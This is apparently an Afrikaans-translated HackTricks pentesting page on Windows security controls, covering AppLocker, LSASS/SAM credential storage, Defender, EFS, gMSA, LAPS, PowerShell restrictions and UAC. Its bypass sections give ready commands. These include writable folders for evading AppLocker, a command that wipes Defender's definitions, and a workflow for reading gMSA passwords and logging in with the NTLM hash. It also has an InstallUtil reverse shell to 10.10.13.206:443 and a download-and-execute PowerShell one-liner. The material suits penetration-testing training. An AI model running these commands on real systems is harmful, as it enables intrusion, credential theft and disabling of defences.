# Windows Sekuriteitskontroles

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Beleid

'n Aansoek-witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om op 'n stelsel teenwoordig te wees en uitgevoer te word. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie in lyn is met die spesifieke sakebehoeftes van 'n organisasie nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **aansoek-witlys-oplossing** en gee stelselsadministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **gedetailleerde beheer** oor executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
Dit is algemeen dat organisasies **block cmd.exe and PowerShell.exe** en skryftoegang tot sekere gidse beperk, **maar dit alles kan omseil word**.

### Check

Kontroleer watter lêers/uitbreidings swartlys/witlys is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied 'n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Useful **skryfbare vouers** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **skryfbare vouers** you can use to **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Dikwels **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Sleg geskryfde reëls kan ook omseil word**
- Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **gids met die naam `allowed`** enige plek skep en dit sal toegelaat word.
- Organisasies fokus ook dikwels op die **blokkeer van die `%System32%\WindowsPowerShell\v1.0\powershell.exe` uitvoerbare**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement word baie selde geaktiveer** weens die bykomende las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat nodig is om te verseker dat niks sal breek nie. Dus sal die gebruik van **DLLs as backdoors** help om AppLocker te omseil.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **execute Powershell** kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Kredensiële berging

### Security Accounts Manager (SAM)

Plaaslike kredensiële is in hierdie lêer teenwoordig; die wagwoorde is gehash.

### Local Security Authority (LSA) - LSASS

Die **kredensiële** (gehash) word **gestoor** in die **geheue** van hierdie subsisteem vir Single Sign-On redes.\
**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikerstoestemmings...), **authentication**, **access tokens**...\
LSA sal die een wees wat die verskafde kredensiële binne die **SAM**-lêer sal **kontroleer** (vir 'n plaaslike aanmelding) en met die **domain controller** sal **praat** om 'n domeingebruiker te verifieer.

Die **kredensiële** word **gestoor** binne die **proses LSASS**: Kerberos-kaartjies, NT- en LM-hashe, wagwoorde wat maklik gedekripteer kan word.

### LSA secrets

LSA kan sekere kredensiële op skyf stoor:

- Wagwoord van die rekenaarrekening van die Active Directory (onbereikbare domain controller).
- Wagwoorde van die rekeninge van Windows-dienste
- Wagwoorde vir geskeduleerde take
- Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die databasis van die Active Directory. Dit is slegs op Domain Controllers teenwoordig.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is 'n Antivirus wat beskikbaar is in Windows 10 en Windows 11, en in weergawes van Windows Server. Dit **blokkeer** algemene pentesting-instrumente soos **`WinPEAS`**. Daar is egter maniere om hierdie beskermings te **omseil**.

### Kontroleer

Om die **status** van **Defender** te kontroleer kan jy die PS-cmdlet **`Get-MpComputerStatus`** uitvoer (kyk na die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumereer kan jy ook die volgende uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Gekodeerde Lêerstelsel (EFS)

EFS beveilig lêers deur enkripsie en gebruik 'n **simmetriese sleutel** bekend as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **openbare sleutel** gekodeer en in die gekodeerde lêer se $EFS **alternatiewe datastraam** gestoor. Wanneer ontsleuteling nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK vanaf die $EFS-stroom te ontsleutel. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Ontsleuteling-scenario's sonder gebruikersinisiëring** sluit in:

- Wanneer lêers of vouers na 'n nie-EFS lêerstelsel verskuif word, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), word hulle outomaties ontsleuteld.
- Gekodeerde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor transmissie ontsleuteld.

Hierdie enkripsiemetode laat die eienaar toe om op 'n **deursigtige wyse** toegang tot die gekodeerde lêers te hê. Net die eienaar se wagwoord verander en aanmeld sal egter nie ontsleuteling moontlik maak nie.

Belangrike punte:

- EFS gebruik 'n simmetriese FEK, wat met die gebruiker se openbare sleutel gekodeer is.
- Ontsleuteling gebruik die gebruiker se privaat sleutel om by die FEK uit te kom.
- Outomatiese ontsleuteling vind plaas onder spesifieke toestande, soos kopieer na FAT32 of netwerktransmissie.
- Gekodeerde lêers is vir die eienaar toeganklik sonder ekstra stappe.

### Kontroleer EFS-inligting

Kyk of 'n **gebruiker** hierdie **diens** gebruik het deur te kyk of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **wie** toegang tot die lêer het met die gebruik van cipher /c \<file\>  
Jy kan ook gebruik maak van `cipher /e` en `cipher /d` binne 'n gids om alle lêers te **enkripteer** en **ontsleutel**.

### Ontsleuteling van EFS-lêers

#### Wees SYSTEM

Hierdie metode vereis dat die **slagoffer-gebruiker** 'n **proses** op die gasheer laat loop. As dit die geval is, kan jy met 'n `meterpreter` sessie die token van die gebruiker se proses simuleer (`impersonate_token` van `incognito`). Of jy kan net na die gebruiker se proses `migrate`.

#### Weet die gebruiker se wagwoord


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Gegroepeerde Beheerde Diensrekeninge (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "Password never expire" instelling aangeskakel het, bied gMSA's 'n veiliger en beter hanteerbare oplossing:

- **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein- of rekenaarbeleid. Hierdie proses word deur Microsoft's Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
- **Verbeterde Sekuriteit**: Hierdie rekeninge is immuun teen kontosluitings en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verhoog.
- **Ondersteuning vir Meerdere Host**: gMSA's kan oor meerdere hosts gedeel word, wat hulle ideaal maak vir dienste wat op meerdere bedieners loop.
- **Geskeduleerde Taakvermoë**: Anders as managed service accounts, ondersteun gMSA's die uitvoering van geskeduleerde take.
- **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties by wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA's word gestoor in die LDAP-eiendom _**msDS-ManagedPassword**_ en word outomaties elke 30 dae deur Domain Controllers (DCs) gereset. Hierdie wagwoord, 'n enkodeerde datablik bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA's geïnstalleer is, onttrek word, wat 'n veilige omgewing verseker. Om by hierdie inligting te kom, is 'n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geverifieer wees.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Jy kan hierdie wagwoord uitlees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)

In baie omgewings kan laag‑privilegie gebruikers sonder om die DC te kompromitteer na gMSA‑geheime draai deur miskonfigureerde objek‑ACLs te misbruik:

- 'n groep wat jy kan beheer (bv. via GenericAll/GenericWrite) word toegestaan met `ReadGMSAPassword` oor 'n gMSA.
- Deur jouself by daardie groep te voeg, erf jy die reg om die gMSA se `msDS-ManagedPassword` blob oor LDAP te lees en bruikbare NTLM credentials af te lei.

Tipiese werkvloeistroom:

1) Ontdek die pad met BloodHound en merk jou foothold‑principals as Owned. Soek na rande soos:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Voeg jouself by die tussengroep wat jy beheer (voorbeeld met bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lees die gMSA-beheerde wagwoord via LDAP en lei die NTLM-hash af. NetExec outomatiseer die uittrekking van `msDS-ManagedPassword` en die omskakeling na NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Meld aan as die gMSA deur die NTLM-hash te gebruik (geen plaintext nodig nie). As die rekening in Remote Management Users is, sal WinRM direk werk:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
- gMSAs word dikwels voorsien van plaaslike regte soos WinRM; verifieer groep-lidmaatskap (bv. Remote Management Users) om laterale beweging te beplan.
- As jy net die blob nodig het om die NTLM self te bereken, sien MSDS-MANAGEDPASSWORD_BLOB-structuur.



## LAPS

Die **Local Administrator Password Solution (LAPS)**, beskikbaar vir aflaai by [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), stel die bestuur van plaaslike Administrator-wagwoorde in staat. Hierdie wagwoorde, wat **willekeurig gegenereer**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs beperk tot gemagtigde gebruikers. As voldoende toestemmings toegeken is, kan die vermoë om plaaslike admin-wagwoorde te lees verkry word.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die funksies af** wat nodig is om PowerShell effektief te gebruik, soos die blokkering van COM-objekte, beperking tot goedgekeurde .NET-tipes, XAML-gebaseerde workflows, PowerShell-klasse, en meer.

### **Kontroleer**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie bypass nie werk nie, maar jy kan [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Om dit te compileer mag jy** **moet** _**Voeg 'n verwysing by**_ -> _Blaai_ -> _Blaai_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direkte bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die constrained mode te omseil. Vir meer inligting sien: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Uitvoeringsbeleid

Standaard is dit ingestel op **restricted.** Hoof maniere om hierdie beleid te omseil:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer inligting is beskikbaar [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Is die API wat gebruik kan word om gebruikers te verifieer.

Die SSPI is verantwoordelik om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Dan sal die SSPI onderhandel watter verifikasieprotokol gebruik sal word; hierdie verifikasieprotokolle word Security Support Provider (SSP) genoem, is geleë in elke Windows-masjien in die vorm van 'n DLL en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.

### Hoof SSPs

- **Kerberos**: Die voorkeur een
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Kompatibiliteitsredes
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webservers en LDAP, wagwoord in die vorm van 'n MD5-hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL and TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Dit word gebruik om die protokol te onderhandel wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of net een aanbied.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingprompt vir verhoogde aktiwiteite** moontlik maak.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
